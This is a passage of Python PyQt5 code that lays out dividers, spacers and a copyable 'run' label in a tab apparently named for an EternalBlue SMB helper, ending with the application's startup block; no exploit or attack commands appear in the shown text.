            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider1)
            self.smbhelper_EternalBlue_divider1.deleteLater()
        self.smbhelper_EternalBlue_divider1 = QFrame()
        self.smbhelper_EternalBlue_divider1.setFrameShape(QFrame.HLine)
        self.smbhelper_EternalBlue_divider1.setLineWidth(3)
        self.smbhelper_EternalBlue_divider1.setStyleSheet("color: #20C20E;")
     
        # smbhelper_EternalBlue_divider2
        if hasattr(self, 'smbhelper_EternalBlue_divider2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider2)
            self.smbhelper_EternalBlue_divider2.deleteLater()
        self.smbhelper_EternalBlue_divider2 = QFrame()
        self.smbhelper_EternalBlue_divider2.setFrameShape(QFrame.HLine)
        self.smbhelper_EternalBlue_divider2.setLineWidth(3)
        self.smbhelper_EternalBlue_divider2.setStyleSheet("color: #20C20E;")
     
        # smbhelper_EternalBlue_spacer1
        if hasattr(self, 'smbhelper_EternalBlue_spacer1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer1)
            self.smbhelper_EternalBlue_spacer1.deleteLater()
        self.smbhelper_EternalBlue_spacer1 = QLabel()
        self.smbhelper_EternalBlue_spacer1.setFixedWidth(40)
        self.smbhelper_EternalBlue_spacer1.setFixedHeight(50)
     
        # smbhelper_EternalBlue_spacer2
        if hasattr(self, 'smbhelper_EternalBlue_spacer2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer2)
            self.smbhelper_EternalBlue_spacer2.deleteLater()
        self.smbhelper_EternalBlue_spacer2 = QLabel()
        self.smbhelper_EternalBlue_spacer2.setFixedWidth(40)
        self.smbhelper_EternalBlue_spacer2.setFixedHeight(50)
     
        # smbhelper_EternalBlue spacer & divider layout
        self.tab8_container_layout.insertWidget(91, self.smbhelper_EternalBlue_spacer1)
        self.tab8_container_layout.insertWidget(92, self.smbhelper_EternalBlue_divider1)
        self.tab8_container_layout.insertWidget(93, self.smbhelper_EternalBlue_divider2)
        self.tab8_container_layout.insertWidget(94, self.smbhelper_EternalBlue_spacer2)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_EternalBlue_Scan11
        if hasattr(self, 'smbhelper_EternalBlue_Scan11'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan11)
            self.smbhelper_EternalBlue_Scan11.deleteLater()
        self.smbhelper_EternalBlue_Scan11 = QLabel("run")
        self.smbhelper_EternalBlue_Scan11.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab8_container_layout.insertWidget(95,self.smbhelper_EternalBlue_Scan11)
     
        # smbhelper_EternalBlue_Scan11_Copy
        if hasattr(self, 'smbhelper_EternalBlue_Scan11_Copy'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan11_Copy)
            self.smbhelper_EternalBlue_Scan11_Copy.deleteLater()
        self.smbhelper_EternalBlue_Scan11_Copy = QPushButton()
        self.smbhelper_EternalBlue_Scan11_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.smbhelper_EternalBlue_Scan11_Copy.setFixedSize(QSize(20,20))
        self.smbhelper_EternalBlue_Scan11_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_EternalBlue_Scan11.text()))
        self.smbhelper_EternalBlue_Scan11_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # smbhelper_EternalBlue_Scan11 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.smbhelper_EternalBlue_Scan11_Copy)
        label_layout.addWidget(self.smbhelper_EternalBlue_Scan11)
        self.tab8_container_layout.insertLayout(96, label_layout)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_EternalBlue_divider1
        if hasattr(self, 'smbhelper_EternalBlue_divider1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider1)
            self.smbhelper_EternalBlue_divider1.deleteLater()
        self.smbhelper_EternalBlue_divider1 = QFrame()
        self.smbhelper_EternalBlue_divider1.setFrameShape(QFrame.HLine)
        self.smbhelper_EternalBlue_divider1.setLineWidth(3)
        self.smbhelper_EternalBlue_divider1.setStyleSheet("color: #20C20E;")
     
        # smbhelper_EternalBlue_divider2
        if hasattr(self, 'smbhelper_EternalBlue_divider2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider2)
            self.smbhelper_EternalBlue_divider2.deleteLater()
        self.smbhelper_EternalBlue_divider2 = QFrame()
        self.smbhelper_EternalBlue_divider2.setFrameShape(QFrame.HLine)
        self.smbhelper_EternalBlue_divider2.setLineWidth(3)
        self.smbhelper_EternalBlue_divider2.setStyleSheet("color: #20C20E;")
     
        # smbhelper_EternalBlue_spacer1
        if hasattr(self, 'smbhelper_EternalBlue_spacer1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer1)
            self.smbhelper_EternalBlue_spacer1.deleteLater()
        self.smbhelper_EternalBlue_spacer1 = QLabel()
        self.smbhelper_EternalBlue_spacer1.setFixedWidth(40)
        self.smbhelper_EternalBlue_spacer1.setFixedHeight(50)
     
        # smbhelper_EternalBlue_spacer2
        if hasattr(self, 'smbhelper_EternalBlue_spacer2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer2)
            self.smbhelper_EternalBlue_spacer2.deleteLater()
        self.smbhelper_EternalBlue_spacer2 = QLabel()
        self.smbhelper_EternalBlue_spacer2.setFixedWidth(40)
        self.smbhelper_EternalBlue_spacer2.setFixedHeight(50)
     
        # smbhelper_EternalBlue spacer & divider layout
        self.tab8_container_layout.insertWidget(97, self.smbhelper_EternalBlue_spacer1)
        self.tab8_container_layout.insertWidget(98, self.smbhelper_EternalBlue_divider1)
        self.tab8_container_layout.insertWidget(99, self.smbhelper_EternalBlue_divider2)
        self.tab8_container_layout.insertWidget(100, self.smbhelper_EternalBlue_spacer2)
        self.tab8_container_layout.addStretch()


if __name__ == '__main__':
    app = QApplication(sys.argv)
    main_window = MainWindow()
    main_window.show()
    sys.exit(app.exec_())
